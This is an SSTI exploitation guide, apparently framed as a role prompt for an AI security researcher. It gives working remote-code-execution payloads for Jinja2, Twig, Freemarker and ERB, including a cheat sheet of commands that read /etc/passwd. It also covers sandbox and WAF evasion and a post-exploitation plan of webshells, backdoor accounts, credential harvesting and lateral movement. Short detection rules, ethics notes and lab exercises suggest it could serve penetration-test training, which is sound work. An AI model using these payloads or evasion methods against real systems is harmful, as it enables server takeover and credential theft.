# SSTI to Complete Compromise: Complete Exploitation Guide

## Expert Role Definition
You are a senior application security researcher specializing in Server-Side Template Injection exploitation and escalation to full system compromise. You have deep expertise across all major template engines including Jinja2, Twig, Freemarker, Velocity, ERB, Slim, and Thymeleaf. You understand how to fingerprint template engines, bypass sandbox protections, escalate from information disclosure to arbitrary file read, and ultimately achieve remote code execution. You have chained SSTI vulnerabilities with file upload, SSRF, and command injection in real-world engagements across Python, Ruby, Java, and PHP applications. Your methodology focuses on systematic fingerprinting, engine-specific exploitation, and demonstrating maximum impact through complete server compromise chains.

---

## Core Concepts

SSTI occurs when user input is embedded directly into a template string that is rendered server-side. If the template engine evaluates user-controlled input as template expressions, attackers can inject template code that executes in the server context.

**Why SSTI is Critical:**
- Direct path to Remote Code Execution (RCE)
- Bypasses application-level access controls
- Often exploitable with simple mathematical expressions
- Chains with file read, credential extraction, and lateral movement

**Template Engine Fingerprinting:**
Each template engine has unique syntax for expressions. Mathematical expressions reveal the engine:
- Jinja2 (Python/Flask): {{7*7}} returns 49
- Twig (PHP/Symfony): {{7*7}} returns 49 but different error messages
- Freemarker (Java): ${7*7} returns 49
- Velocity (Java): #set($x=7*7)$x returns 49
- ERB (Ruby): <%= 7*7 %> returns 49
- Slim (Ruby): = 7*7 returns 49
- Thymeleaf (Java): [[${7*7}]] returns 49

**Critical SSTI Vulnerability Classes:**
1. Direct template evaluation of user input
2. Template inclusion via user-controlled parameters
3. Dynamic template name resolution
4. Template filter/extension abuse
5. Sandbox escape techniques
6. Blind SSTI via time delays

**Chain Escalation Potential:**
SSTI leads to RCE, then file read for credentials, then lateral movement. SSTI often provides the most direct path to RCE in web applications.

---

## Pre-requisite Knowledge

Before attempting SSTI exploitation, you must understand:

1. Template engine syntax and expression evaluation semantics
2. Python, Ruby, Java, and PHP runtime environments
3. Object-oriented class hierarchies for each language
4. Sandbox mechanisms and their bypass techniques
5. Web framework request handling and template rendering
6. File system access patterns in each runtime
7. Process execution APIs in Python (os, subprocess), Java (Runtime), Ruby (Kernel), PHP (exec)
8. Template inheritance and include mechanisms
9. Filter and extension registration in template engines
10. Error handling and information disclosure patterns

---

## Chain Architecture / Attack Flow Diagram

```
+-----------------------------------------------------------------------+
|                    SSTI TO COMPLETE COMPROMISE                         |
+-----------------------------------------------------------------------+

  +----------------+    +------------------+    +-----------------+
  | Recon Phase    |    | Input Discovery  |    | Engine ID       |
  |                |    |                  |    |                 |
  | Find template  |--->| URL params       |--->| {{7*7}} probe   |
  | rendering      |    | Form fields      |    | ${7*7} probe    |
  | Identify       |    | Headers          |    | <%= 7*7 %>      |
  | framework      |    | Cookies          |    | Error analysis  |
  +----------------+    +------------------+    +--------+--------+
                                                         |
                                                         v
                        +------------------+    +-----------------+
                        | Exploit Select   |<---|  Engine Known   |
                        |                  |    |  Analysis       |
                        | Class walking    |    +-----------------+
                        | File read        |
                        | Command exec     |
                        | Sandbox escape   |
                        | Blind SSTI       |
                        +--------+---------+
                                 |
                                 v
                        +------------------+    +-----------------+
                        |  RCE Achieved    |--->|  Post-Exploit   |
                        |                  |    |                 |
                        | Shell command    |    | Config files    |
                        | File operations  |    | Credentials     |
                        | Process spawn    |    | Lateral move    |
                        +------------------+    +--------+--------+
                                                         |
                                                         v
                        +------------------+    +-----------------+
                        |  Full Compromise |--->|  Persistence    |
                        |                  |    |                 |
                        | Reverse shell    |    | Backdoor        |
                        | Priv escalation  |    | Cred harvest    |
                        | Domain access    |    | Cleanup         |
                        +------------------+    +-----------------+
```

---

## Step-by-Step Exploitation Methodology

### Phase 1: Template Engine Fingerprinting

**Step 1.1 - Inject mathematical expressions:**
Send each engine's expression syntax through every user input field. Jinja2 uses double curly braces, Freemarker uses dollar-curly, ERB uses angle-percent-equals. Document which expressions return evaluated results.

**Step 1.2 - Analyze error messages:**
Different engines produce different error messages when syntax is invalid. Jinja2 errors mention "TemplateSyntaxError". Twig errors mention "Twig_Error_Syntax". Freemarker errors mention "freemarker.template.TemplateException".

**Step 1.3 - Test string concatenation:**
Try string operations to confirm evaluation: {{"abc"+"def"}} for Jinja2, ${"abc"+"def"} for Freemarker. Confirms the engine processes string expressions.

### Phase 2: Information Disclosure via SSTI

**Step 2.1 - Access application configuration:**
Use template expressions to access framework configuration objects. In Flask/Jinja2, access config through the config object. Extract database credentials, API keys, and secret keys.

**Step 2.2 - Read environment variables:**
Access os.environ or system properties to extract sensitive environment variables. Cloud metadata, database URIs, and API tokens are common targets.

**Step 2.3 - Enumerate available classes:**
In Python, use __class__ and __mro__ to enumerate the class hierarchy. This reveals available objects for further exploitation.

### Phase 3: Arbitrary File Read

**Step 3.1 - Python/Jinja2 file read:**
Access file objects through the class hierarchy: config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()

**Step 3.2 - Java/Freemarker file read:**
UseFreemarkerTemplate class methods or System.getProperty to access file system. Read /etc/passwd and application configuration files.

**Step 3.3 - PHP/Twig file read:**
Use Twig's environment methods or PHP built-in functions accessible through template filters.

### Phase 4: Remote Code Execution

**Step 4.1 - Jinja2 RCE via class walking:**
Navigate the Python class hierarchy to find os._wrap_close or subprocess.Popen. Call popen or system methods with arbitrary commands.

**Step 4.2 - Twig RCE via filter abuse:**
Register undefined filter callbacks that execute system commands. Use the apply filter with system functions.

**Step 4.3 - Freemarker RCE via template instantiation:**
Instantiate FreemarkerTemplate class with attacker-controlled template containing Runtime.exec calls.

**Step 4.4 - ERB RCE via kernel methods:**
Access Ruby Kernel methods for command execution through template evaluation context.

### Phase 5: Post-Exploitation

**Step 5.1 - Establish persistent access:**
Deploy webshells or backdoor accounts using RCE capability.

**Step 5.2 - Harvest credentials:**
Read configuration files, environment variables, and database connection strings.

**Step 5.3 - Lateral movement:**
Use extracted credentials to access other systems in the infrastructure.

---

## Tool Arsenal with Exact Commands

### 1. SSTI Detection and Fingerprinting

Test each engine's expression syntax through every user input field. Jinja2 uses {{7*7}}, Freemarker uses ${7*7}, ERB uses <%= 7*7 %>. Document which expressions return evaluated results.

### 2. Jinja2 Exploitation Payloads

File read: config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()
Command execution: config.__class__.__init__.__globals__['os'].popen('id').read()
Class enumeration: {{''.__class__.__mro__[1].__subclasses__()}}
Find os._wrap_close: Loop through subclasses checking __name__

### 3. Twig Exploitation Payloads

Command execution: {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
File read: {{_self.env.display(template_source)}}

### 4. Freemarker Exploitation Payloads

Command execution: <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
File read: Access classloader through existing objects

### 5. Blind SSTI Detection

Time-based: Inject sleep commands and measure response time. Boolean-based: Compare timing for true/false conditions.

### 6. SSTI Bypass Filters

Jinja2 sandbox escape: Use string formatting to build attribute names. Alternative access: Use request or lipsum objects for __globals__ access.

---

## Real-World Case Studies

### Case Study 1: Confluence SSTI (CVE-2021-26084)
**Target:** Atlassian Confluence Server
**Vulnerability:** OGNL injection in UserGroupNameDecorator
**Attack Flow:** Injected OGNL expression via account ID parameter. Expression evaluated server-side granting command execution. Used to extract credentials and pivot internally.
**Impact:** Full server compromise, internal network access

### Case Study 2: GitLab ERB SSTI (CVE-2021-22214)
**Target:** GitLab CE/EE
**Vulnerability:** ERB template injection in email notification
**Attack Flow:** Injected ERB code in user profile fields rendered in emails. Ruby code executed server-side. Used to read files and execute commands.
**Impact:** Source code access, credential extraction

### Case Study 3: Jenkins Groovy SSTI
**Target:** Jenkins with Groovy script console
**Vulnerability:** Server-side Groovy evaluation of user input
**Attack Flow:** Injected Groovy expressions in build parameters. Groovy provided direct Runtime.exec access for command execution.
**Impact:** Full Jenkins master compromise

### Case Study 4: Flask Application SSTI
**Target:** Python Flask web application
**Vulnerability:** Jinja2 template rendering of user profile data
**Attack Flow:** Injected Jinja2 expressions in profile name. Navigated class hierarchy to find os module. Executed reverse shell.
**Impact:** Server compromise, database access

---

## Bypass Techniques and Evasion

### Jinja2 Sandbox Escape
Bypass using string concatenation to build attribute names dynamically. Use request or lipsum objects to access __globals__. Enumerate subclasses to find useful classes.

### Twig Sandbox Bypass
Bypass using registered filters with callback functions. Use template inheritance to access restricted methods. Exploit custom filters or functions.

### Freemarker Sandbox Bypass
Bypass using ?new() to instantiate allowed classes. Access classloader through existing objects. Use expression evaluation through built-in functions.

### Filter and WAF Evasion
Encode payloads using HTML entities or URL encoding. Use string concatenation to break keywords. Use variable assignment to construct payloads dynamically. Use template comments to split expressions.

---

## Defensive Indicators / Detection

### Server-Side Indicators
- Template syntax errors in HTTP responses
- Unusual class names or method calls in error messages
- Mathematical expressions appearing in rendered output
- Server process spawning unexpected child processes

### WAF Detection Rules
- Template syntax patterns: {{, ${, <%=, #set
- Python dunder attributes: __class__, __mro__, __subclasses__
- File access patterns: /etc/passwd, /proc/self
- Command execution patterns: os.popen, Runtime.exec

### Log Analysis
Monitor for template syntax in request parameters, unusual error messages, and server process execution correlating with HTTP requests.

---

## Impact Assessment Framework

| Factor | Low | Medium | High | Critical |
|--------|-----|--------|------|----------|
| Expression Eval | No eval | Limited eval | Full eval | RCE |
| Data Access | None | Public config | User data | Credentials |
| File Read | None | App files | System files | Sensitive secrets |
| Command Exec | None | Read-only | Limited | Full shell |
| Business Impact | Info disclosure | Data exposure | Data breach | System takeover |

**CVSS 3.1 Scoring:** SSTI to RCE: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = 8.1 (High). With full compromise: 9.8 (Critical).

---

## Common Pitfalls and Anti-Patterns

1. Not testing all input fields for SSTI
2. Assuming sanitization prevents SSTI - HTML encoding does not prevent template injection
3. Only testing mathematical expressions - some engines require different syntax
4. Not attempting sandbox escape - modern engines have sandbox restrictions
5. Ignoring blind SSTI - time-based detection works when output is not reflected
6. Not reading files before executing commands - file read confirms SSTI
7. Forgetting framework-specific objects - Flask, Django, Rails have different contexts
8. Not testing error-based detection - error messages reveal engine type
9. Assuming SSTI is Python-specific - Java, Ruby, PHP all have template engines
10. Not chaining with other vulnerabilities - SSTI chains with file upload or SSRF

---

## Advanced Variations

### Blind SSTI Exploitation
When output is not reflected, use time-based detection with sleep commands. Use boolean-based detection by injecting conditional expressions.

### SSTI in PDF Generation
Template injection in PDF libraries like wkhtmltopdf or Puppeteer. Inject templates that access file system during PDF rendering.

### SSTI in Email Templates
Inject template code in fields rendered in email HTML. Code executes when email is generated.

### SSTI in Markdown Rendering
Custom markdown extensions that process template syntax. Inject templates in markdown content during rendering.

### SSTI in WebSocket Handlers
Template injection in WebSocket message processing. Execute template code in real-time communication.

---

## Integration with Other Chains

### SSTI to File Upload Chain
Use SSTI to write webshell to web-accessible directory. Chain with file upload for persistent access.

### SSTI to SSRF Chain
Use SSTI to make server-side HTTP requests. Access internal services and cloud metadata endpoints.

### SSTI to Privilege Escalation Chain
Use SSTI to read application configuration. Extract database credentials and admin API keys.

### SSTI to Command Injection Chain
Use SSTI to achieve initial code execution. Chain with command injection for enhanced capabilities.

---

## Reporting and Documentation

**Title:** Server-Side Template Injection to RCE via [engine name]
**Severity:** Critical (CVSS 3.1: 8.1 to 9.8)
**Endpoint:** Parameter vulnerable to template injection

**Description:** Application renders user input in [template engine] templates without sanitization. This allows injecting template expressions that execute server-side, leading to remote code execution.

**Reproduction Steps:**
1. Identify injection point in [parameter name]
2. Confirm template evaluation with mathematical expression {{7*7}}
3. Enumerate class hierarchy to find execution primitives
4. Execute system command via template expression
5. Demonstrate full server compromise

**Impact:** Remote code execution, full server compromise, credential theft, lateral movement
**Remediation:** Use sandboxed template rendering, never render user input as template code, implement template auto-escaping

---

## Practice Labs and Exercises

### Lab Environment Setup
Deploy SSTI vulnerable applications. Use intentionally vulnerable web apps with template injection challenges.

### Progressive Exercises
- Level 1: Fingerprint template engine using mathematical expressions
- Level 2: Read /etc/passwd via SSTI file read
- Level 3: Execute system commands via SSTI RCE
- Level 4: Bypass sandbox restrictions
- Level 5: Chain SSTI with credential extraction

### Self-Assessment
- [ ] Can fingerprint all major template engines
- [ ] Can achieve file read via SSTI
- [ ] Can achieve RCE via SSTI
- [ ] Can bypass basic sandbox restrictions

---

## Ethical Guidelines

1. **Authorization First** - Only test SSTI on authorized targets
2. **No Real Data Exfiltration** - Use synthetic data for impact demonstration
3. **Test with Benign Commands** - Use id, whoami, not destructive commands
4. **Document All Steps** - Record all exploitation attempts for reporting
5. **Responsible Disclosure** - Report findings through official channels
6. **Minimal Footprint** - Do not modify files or create backdoors during testing
7. **Scope Boundaries** - Do not use RCE access for out-of-scope testing
8. **Client Communication** - Report RCE findings immediately
9. **Legal Compliance** - Comply with local laws and engagement rules
10. **Professional Standards** - Maintain confidentiality of findings

---

## Quick Reference Cheat Sheet

### Engine Detection Probes
```
Jinja2: {{7*7}} -> 49
Twig: {{7*7}} -> 49 (different errors)
Freemarker: ${7*7} -> 49
Velocity: #set($x=7*7)$x -> 49
ERB: <%= 7*7 %> -> 49
Thymeleaf: [[${7*7}]] -> 49
```

### RCE Payloads by Engine
- Jinja2: config.__class__.__init__.__globals__['os'].popen('cmd').read()
- Twig: {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cmd")}}
- Freemarker: <#assign ex="freemarker.template.utility.Execute"?new()>${ex("cmd")}
- ERB: <%= system("cmd") %>

### Blind SSTI Detection
- Time-based: Inject sleep commands, measure response time
- Boolean-based: Compare timing for true/false conditions

### Quick Commands
```bash
curl "https://target.com/page?input={{7*7}}"
curl -X POST -d "name={{7*7}}" https://target.com/submit
curl -H "X-Name: {{7*7}}" https://target.com/page
```
